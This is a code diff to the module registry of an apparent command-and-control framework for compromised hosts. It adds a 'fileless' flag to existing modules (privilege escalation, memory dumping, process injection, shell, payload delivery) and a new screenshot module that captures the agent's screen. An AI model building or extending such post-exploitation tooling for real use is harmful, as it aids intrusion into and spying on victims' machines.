@@ -20,6 +20,7 @@ const (
 	ModFileServer   = "file_server"
 	ModDownloader   = "file_downloader"
 	ModMemDump      = "mem_dump"
+	ModSCREENSHOT   = "screenshot"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
@@ -64,6 +65,7 @@ type ModuleConfig struct {
 	IsLocal     bool              `json:"is_local"`     // If true, this module is a C2 plugin and doesn't run on agent, use `Build` to specify the command to run
 	Platform    string            `json:"platform"`     // targeting which OS? Linux/Windows
 	Path        string            `json:"path"`         // Path to the module directory
+	Fileless    bool              `json:"fileless"`     // If true, this module doesn't drop files to disk
 	Options     ModOptions        `json:"options"`      // module options, will be passed as environment variables to the module, either on C2 or agent side
 	AgentConfig AgentModuleConfig `json:"agent_config"` // Configuration for agent side
 }
@@ -79,6 +81,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"download_addr": &ModOption{
 				Name: "download_addr",
@@ -103,6 +106,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"cmd_to_exec": &ModOption{
 				Name: "cmd_to_exec",
@@ -132,6 +136,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"keyword": &ModOption{
 				Name: "keyword",
@@ -157,6 +162,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"lpe_helper": &ModOption{
 				Name: "lpe_helper",
@@ -207,6 +213,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"elf_path": &ModOption{
 				Name: "elf_path",
@@ -241,6 +248,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"port": &ModOption{
 				Name: "port",
@@ -278,6 +286,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"to": &ModOption{
 				Name: "to",
@@ -325,6 +334,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"shell": &ModOption{
 				Name: "shell",
@@ -363,6 +373,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"pid": &ModOption{
 				Name: "pid",
@@ -394,6 +405,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"addr": &ModOption{
 				Name: "addr",
@@ -425,6 +437,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"payload": &ModOption{
 				Name: "payload",
@@ -456,6 +469,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Linux",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"code_pattern": &ModOption{
 				Name: "code_pattern",
@@ -492,6 +506,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: true,
 		Options: ModOptions{
 			"port": &ModOption{
 				Name: "port",
@@ -521,6 +536,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"download_addr": &ModOption{
 				Name: "download_addr",
@@ -555,6 +571,7 @@ var Modules = map[string]*ModuleConfig{
 		IsLocal:  false,
 		Platform: "Generic",
 		Path:     "",
+		Fileless: false,
 		Options: ModOptions{
 			"pid": &ModOption{
 				Name: "pid",
@@ -562,6 +579,25 @@ var Modules = map[string]*ModuleConfig{
 				Val:  "",
 			},
 		},
+		AgentConfig: AgentModuleConfig{
+			Exec:          "built-in",
+			Files:         []string{},
+			InMemory:      false,
+			Type:          "go",
+			IsInteractive: false,
+		},
+	},
+	ModSCREENSHOT: {
+		Name:     ModSCREENSHOT,
+		Build:    "",
+		Author:   "jm33-ng",
+		Date:     "2020-01-25",
+		Comment:  "Take a screenshot of the agent's screen",
+		IsLocal:  false,
+		Platform: "Generic",
+		Path:     "",
+		Fileless: false,
+		Options:  ModOptions{},
 		AgentConfig: AgentModuleConfig{
 			Exec:          "built-in",
 			Files:         []string{},
